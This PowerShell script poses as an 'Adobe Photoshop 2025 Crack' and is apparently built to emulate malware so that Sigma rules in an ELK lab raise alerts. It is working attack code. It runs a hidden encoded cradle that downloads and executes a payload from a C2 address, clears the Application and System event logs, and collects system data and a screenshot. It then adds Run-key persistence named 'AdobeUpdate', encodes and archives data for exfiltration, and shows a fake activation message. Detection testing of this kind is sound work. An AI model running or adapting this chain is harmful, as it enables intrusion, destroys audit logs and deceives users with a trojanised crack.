<#
.SYNOPSIS
    Adobe Photoshop 2025 Crack - BASELINE Version
    THIS VERSION WILL BE DETECTED BY SIGMA RULES
    
.DESCRIPTION
    Uses classic command-line patterns that Sigma rules are designed to catch:
    - Invoke-WebRequest ... | iex
    - wevtutil cl
    - reg.exe add ...\Run
    - certutil -encode
    - schtasks /create
    
    Each phase prints a unique RunId for ELK tracing.
#>

param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$ExfilEmail = "attacker_collector@protonmail.com",
    [string]$C2Server = "http://192.168.50.20:8080"
)

$ErrorActionPreference = 'SilentlyContinue'
$Global:PhaseRunIds = @{}
$StagingDir = Join-Path $env:TEMP "crack_baseline_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# Helper: Generate unique RunId per phase
function New-PhaseRunId {
    param([int]$PhaseNum)
    $id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    $Global:PhaseRunIds["Phase$PhaseNum"] = $id
    return $id
}

# ============================================================
# FAKE CRACK UI
# ============================================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  Adobe Photoshop 2025 Crack v3.0" -ForegroundColor Green
Write-Host "  ⚠️ BATTEN DOWN THE HATCHES ⚠️" -ForegroundColor Yellow
Write-Host "  RunId: $RunId" -ForegroundColor DarkGray
Write-Host "========================================" -ForegroundColor Green
Start-Sleep -Seconds 2

# ============================================================
# PHASE 1: PowerShell Download Cradle (T1059.001)
# Sigma target: 85b0b087-eddf-4a2b-b033-d771fa2b9775
# ============================================================
$phase1Id = New-PhaseRunId -PhaseNum 1
Write-Host ""
Write-Host "[PHASE 1] Downloading crack payload..." -ForegroundColor Cyan
Write-Host "  RunId: $phase1Id" -ForegroundColor DarkGray

# BASELINE: Classic IWR + IEX pattern - Sigma will catch this!
$downloadScript = @"
Write-Host '[PHASE1_BASELINE] Connecting to C2...'
`$url = '$C2Server/payload.txt'
`$response = Invoke-WebRequest -Uri `$url -UseBasicParsing -TimeoutSec 5
Invoke-Expression `$response.Content
Write-Host '[PHASE1_BASELINE] Payload executed'
"@

$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($downloadScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $encoded" -WindowStyle Hidden

Write-Host "  [+] Download cradle executed (Invoke-WebRequest + IEX)" -ForegroundColor Yellow
Start-Sleep -Seconds 3

# ============================================================
# PHASE 2: Log Clearing (T1070.001)
# Sigma target: cc36992a-4671-4f21-a91d-6c2b72a2edf5
# ============================================================
$phase2Id = New-PhaseRunId -PhaseNum 2
Write-Host ""
Write-Host "[PHASE 2] Clearing event logs..." -ForegroundColor Cyan
Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray

# BASELINE: Direct wevtutil command - Sigma will catch this!
Start-Process -FilePath "wevtutil.exe" `
    -ArgumentList "cl Application" `
    -WindowStyle Hidden -NoNewWindow -Wait

Start-Process -FilePath "wevtutil.exe" `
    -ArgumentList "cl System" `
    -WindowStyle Hidden -NoNewWindow -Wait

Write-Host "  [+] Event logs cleared (wevtutil cl)" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 3: System Discovery (T1082, T1057)
# ============================================================
$phase3Id = New-PhaseRunId -PhaseNum 3
Write-Host ""
Write-Host "[PHASE 3] Collecting system information..." -ForegroundColor Cyan
Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

# Get system info (this is normal - no evasion needed)
$systemInfo = @{
    Phase3_RunId = $phase3Id
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    CPU = (Get-CimInstance Win32_Processor).Name
    RAM_GB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
}
$systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8

# List running processes
Get-Process | Select-Object -First 50 Name, Id, CPU, WorkingSet | 
    Export-Csv -Path (Join-Path $StagingDir "processes_$phase3Id.csv") -NoTypeInformation

Write-Host "  [+] System info collected ($((Get-Process).Count) processes)" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 4: Screen Capture (T1113)
# ============================================================
$phase4Id = New-PhaseRunId -PhaseNum 4
Write-Host ""
Write-Host "[PHASE 4] Capturing screenshot..." -ForegroundColor Cyan
Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

# Using .NET for screenshot (still normal behavior)
$screenshotCode = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap(`$bounds.Width, `$bounds.Height)
`$graphics = [System.Drawing.Graphics]::FromImage(`$bmp)
`$graphics.CopyFromScreen(`$bounds.X, `$bounds.Y, 0, 0, `$bounds.Size)
`$outputPath = "$StagingDir\screenshot_$phase4Id.png"
`$bmp.Save(`$outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
`$bmp.Dispose()
`$graphics.Dispose()
"@
$ssEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($screenshotCode))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $ssEncoded" -WindowStyle Hidden -Wait

Write-Host "  [+] Screenshot captured" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 5: Registry Persistence (T1547.001)
# Sigma target: 24357373-078f-44ed-9ac4-6d334a668a11
# ============================================================
$phase5Id = New-PhaseRunId -PhaseNum 5
Write-Host ""
Write-Host "[PHASE 5] Adding registry persistence..." -ForegroundColor Cyan
Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray

# BASELINE: reg.exe add command - Sigma will catch this!
$regValueName = "AdobeUpdate_$phase5Id"
$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

Start-Process -FilePath "reg.exe" `
    -ArgumentList "add `"$regPath`" /v $regValueName /t REG_SZ /d `"powershell.exe -NoP -W Hidden -Command Write-Host 'Persistence active'`" /f" `
    -WindowStyle Hidden -Wait -NoNewWindow

Write-Host "  [+] Registry persistence added (reg.exe add)" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 6: Data Encoding/Exfiltration (T1560.001, T1041)
# Sigma target: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a
# ============================================================
$phase6Id = New-PhaseRunId -PhaseNum 6
Write-Host ""
Write-Host "[PHASE 6] Preparing data for exfiltration..." -ForegroundColor Cyan
Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray

# BASELINE: certutil -encode - Sigma will catch this!
$inFile = Join-Path $env:TEMP "data_$phase6Id.txt"
$outFile = Join-Path $env:TEMP "encoded_$phase6Id.txt"
Set-Content -Path $inFile -Value "Collected data for $env:COMPUTERNAME" -Encoding ASCII

Start-Process -FilePath "certutil.exe" `
    -ArgumentList "-encode `"$inFile`" `"$outFile`"" `
    -WindowStyle Hidden -Wait -NoNewWindow

Write-Host "  [+] Data encoded (certutil -encode)" -ForegroundColor Yellow

# Create final archive
$zipPath = Join-Path $env:TEMP "exfil_baseline_$RunId.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

Write-Host "  [+] Archive created: $zipPath" -ForegroundColor Yellow

# ============================================================
# FAKE SUCCESS MESSAGE
# ============================================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  ✅ Crack applied successfully! ✅" -ForegroundColor Green
Write-Host "  Adobe Photoshop 2025 is now activated" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green

# ============================================================
# OUTPUT ALL RUN IDs FOR ELK TRACING
# ============================================================
Write-Host ""
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host "  📊 BASELINE VERSION - RUN IDS FOR ELK TRACING" -ForegroundColor Magenta
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host "  Main RunId    : $RunId" -ForegroundColor White
Write-Host "  Phase 1 (IWR) : $phase1Id" -ForegroundColor White
Write-Host "  Phase 2 (wevtutil) : $phase2Id" -ForegroundColor White
Write-Host "  Phase 3 (Discovery) : $phase3Id" -ForegroundColor White
Write-Host "  Phase 4 (Screenshot) : $phase4Id" -ForegroundColor White
Write-Host "  Phase 5 (reg.exe) : $phase5Id" -ForegroundColor White
Write-Host "  Phase 6 (certutil) : $phase6Id" -ForegroundColor White
Write-Host "==============================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "  🔍 SEARCH IN KIBANA:" -ForegroundColor Cyan
Write-Host "     Security → Alerts → search: $RunId" -ForegroundColor Yellow
Write-Host "     Expected: 6 Sigma alerts (one per phase)" -ForegroundColor Yellow
Write-Host "==============================================================" -ForegroundColor Magenta

# Cleanup staging dir (keep zip for exfil demo)
Start-Sleep -Seconds 10
Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue